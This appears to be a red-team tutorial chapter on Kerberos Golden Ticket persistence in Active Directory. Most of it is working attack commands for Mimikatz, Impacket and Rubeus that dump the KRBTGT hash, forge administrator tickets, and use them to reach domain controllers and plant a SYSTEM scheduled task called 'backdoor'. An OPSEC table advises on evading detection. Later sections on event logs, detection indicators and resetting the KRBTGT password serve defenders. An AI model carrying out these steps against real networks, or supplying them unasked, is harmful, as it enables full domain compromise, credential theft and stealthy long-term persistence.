# Golden Ticket Persistence

## Overview

A **Golden Ticket** is a forged Kerberos Ticket-Granting Ticket (TGT). By extracting the KRBTGT account's password hash (NTLM or AES), an attacker can forge valid TGTs for any user in the domain — including the built-in Administrator account — without ever touching a Domain Controller again.

The KRBTGT account is the service account for the Kerberos Key Distribution Center (KDC). Each TGT issued by the DC is encrypted with the KRBTGT hash. If you have this hash, you can create TGTs that the KDC will accept as legitimate.

**Key Advantage:** Once the KRBTGT hash is obtained, persistence does not require any contact with Domain Controllers. You can forge tickets offline and use them on any machine joined to the domain.

---

## Prerequisites

- **Domain Admin** or equivalent privileges on a Domain Controller
- **KRBTGT password hash** (NTLM RC4 or AES256)
- **Domain SID**
- **Target domain name**
- Tools: Mimikatz, Impacket (`ticketer.py`), Rubeus

---

## Step 1: Extract the KRBTGT Hash

### Using Mimikatz (on a DC)

```cmd
mimikatz.exe privilege::debug
```

**DCSync (from any domain-joined machine with DA privileges):**

```cmd
lsadump::dcsync /domain:targetdomain.local /user:krbtgt
```

**DCSync specific hash output:**

```cmd
lsadump::dcsync /domain:targetdomain.local /user:krbtgt /csv
```

**From LSASS memory (on DC):**

```cmd
lsadump::lsa /inject /name:krbtgt
```

**Using `/patch` method:**

```cmd
lsadump::lsa /patch
```

Search for the `krbtgt` account in the output. You need:
- Domain SID (e.g., `S-1-5-21-123456789-123456789-123456789`)
- NTLM hash (RC4) and/or AES256 hash

### Using Impacket (remote)

```bash
impacket-secretsdump -just-dc-user krbtgt domain.local/Administrator:Pass123\!@192.168.1.10
```

### Using PowerView / Invoke-Mimikatz

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
```

---

## Step 2: Extract Domain SID

```cmd
whoami /user
```

Or via PowerShell:

```powershell
(Get-ADDomain).DomainSID.Value
```

Or via Mimikatz:

```cmd
mimikatz.exe "lsadump::lsa /inject /name:krbtgt"
```

The SID is visible in the Mimikatz output (e.g., `Domain : S-1-5-21-...`).

---

## Step 3: Forge the Golden Ticket

### Using Mimikatz

**Basic Golden Ticket (NTLM RC4 hash):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash_here /ptt
```

**Golden Ticket with AES256 (more stealthy):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /aes256:aes256hash_here /ptt
```

**Golden Ticket with custom ID (e.g., RID 500 = built-in Admin):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash_here /id:500 /ptt
```

**Golden Ticket with extended lifetime (default 10 years):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash_here /endin:3650 /ptt
```

**Golden Ticket with group membership (e.g., 519 = Enterprise Admins):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash_here /groups:513,512,520,518,519 /ptt
```

Parameters:
- `/user` - Username to impersonate
- `/domain` - FQDN of the target domain
- `/sid` - Domain SID
- `/krbtgt` - NTLM hash of the KRBTGT account
- `/aes256` - AES256 hash of the KRBTGT account
- `/id` - RID of the user (default: 500)
- `/groups` - Group RIDs for the ticket (default: 513, 512, 520, 518, 519)
- `/ptt` - Pass-the-ticket (injects into current session)
- `/endin` - Ticket lifetime in days (default: 3650)
- `/ticket` - Save to file (e.g., `/ticket:golden.kirbi`)

**Save to file (no /ptt):**

```cmd
kerberos::golden /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash_here /ticket:golden_ticket.kirbi
```

### Using Impacket ticketer.py

```bash
# Basic golden ticket
python3 ticketer.py -nthash ntlmhash_here -domain-sid S-1-5-21-123456789-123456789-123456789 -domain targetdomain.local Administrator

# With AES256
python3 ticketer.py -aesKey aes256hash_here -domain-sid S-1-5-21-123456789-123456789-123456789 -domain targetdomain.local Administrator

# Custom groups and duration
python3 ticketer.py -nthash ntlmhash_here -domain-sid S-1-5-21-123456789-123456789-123456789 -domain targetdomain.local -user-id 500 -groups 513,512,520,518,519 -duration 365 Administrator

# Export environment variable for use
export KRB5CCNAME=/path/to/Administrator.ccache
```

### Using Rubeus (on Windows)

```cmd
Rubeus.exe golden /aes256:aes256hash_here /user:Administrator /id:500 /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /ptt

Rubeus.exe golden /rc4:ntlmhash_here /user:Administrator /domain:targetdomain.local /sid:S-1-5-21-123456789-123456789-123456789 /ptt /netonly
```

---

## Step 4: Use the Golden Ticket

### After `/ptt` — verify with:

```cmd
klist
```

### Access Domain Resources:

```cmd
dir \\DC01\C$
dir \\fileserver\share
```

### Schedule tasks on remote machines:

```cmd
schtasks /create /S DC01 /SC ONLOGON /TR "cmd.exe /c calc.exe" /TN "backdoor" /RU SYSTEM
```

### Using saved ticket file (without /ptt):

```cmd
mimikatz.exe "kerberos::ptt golden_ticket.kirbi"
```

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **Lifetime** | Default Golden Ticket lifetime is 10 years. Real TGTs expire in 10 hours. Use `/endin:10` to match normal TGT lifetime and avoid detection. |
| **Encryption** | Use AES256 (`/aes256`) instead of RC4 to avoid "encryption type downgrade" detection. |
| **User ID** | ID 500 (built-in Administrator) is heavily monitored. Use `/id:1105` with a real but obscure user. |
| **Groups** | Including Enterprise Admins (519) or Domain Admins (512) only when needed. Minimal groups = less scrutiny. |
| **DC Logs** | The ticket is forged offline — but *use* of the ticket generates TGS requests on DCs (event 4769). |
| **Anomalies** | Event 4768 (TGT request) is NOT generated when using a forged TGT. Any TGS request (4769) without a preceding 4768 is suspicious. |
| **DCSync Detection** | Extracting the hash via DCSync generates event 4662 (Directory Service Access) on the DC. Use LSASS dump instead if possible. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4662** | An operation was performed on an object (DCSync on KRBTGT) | DC Security Log |
| **4768** | A Kerberos authentication ticket (TGT) was requested | DC Security Log |
| **4769** | A Kerberos service ticket (TGS) was requested | DC Security Log |
| **4776** | Domain Controller attempted to validate credentials | DC Security Log |
| **4624** | An account was successfully logged on | All machines |

### Detection Indicators

1. **TGS requests without a preceding TGT request** (event 4769 without 4768)
2. **TGT lifetime exceeding the domain policy** (default 10 hours, Golden Ticket can be 10 years)
3. **Encryption type downgrade** (AES → RC4 in TGT/TGS encryption)
4. **TGS requests for privileged users from non-privileged source workstations**
5. **Anomalous user IDs** (e.g., RID 500 from a workstation that doesn't normally use it)

### KQL Detection Query (Event 4769 anomaly)

```
EventID: 4769
Account_Name: Administrator*
Service_Name: * (unusual services like CIFS, HOST from non-DC machines)
Ticket_Encryption_Type: 0x17 (RC4) — when domain normally uses AES
Source_Workstation: unusual (not a DC)
```

### Advanced Detection

- **Jupyter Ticket**: Microsoft tools to inspect Kerberos tickets for anomalies
- **Kerberoast monitoring**: Any 4769 for a service without an SPN query
- **Group membership changes**: Anomalous TGS with high-privilege group memberships

---

## Cleanup / Reversal

### Invalidate All Golden Tickets — Reset KRBTGT Password

All existing Golden Tickets are encrypted with the KRBTGT hash. Changing this password twice (Microsoft's recommendation) invalidates all forged tickets immediately.

**Method 1 — PowerShell:**

```powershell
# Reset KRBTGT password (first time)
Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPass_Phase1!" -Force)

# Wait at least one hour for replication

# Reset KRBTGT password (second time)
Reset-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPass_Phase2!" -Force)
```

**Method 2 — ADUC:**

```
1. Open Active Directory Users and Computers
2. Enable "Advanced Features" under View
3. Navigate to Users > krbtgt
4. Right-click > Reset Password
5. Repeat after 1 hour
```

**Method 3 — Command Line (domain controller):**

```cmd
net user krbtgt NewStr0ngP@ss! /domain
```

Then wait and repeat.

### Post-Reset Verification

```powershell
# Check if KRBTGT password was last changed
Get-ADUser krbtgt -Properties passwordLastSet
```

### Post-Cleanup Actions

- Rotate all Domain Admin passwords
- Review and remove unauthorized accounts
- Check for additional persistence mechanisms
- Reset service account passwords for critical services
- Verify none of the alternative backdoors (DSRM, SSP, Skeleton Key) were installed

---

## References

- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [KRBTGT Password Reset Guidance](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password)
- MITRE ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

---

**Next:** [02 - Silver Ticket](02_Silver_Ticket_Persistence.md)
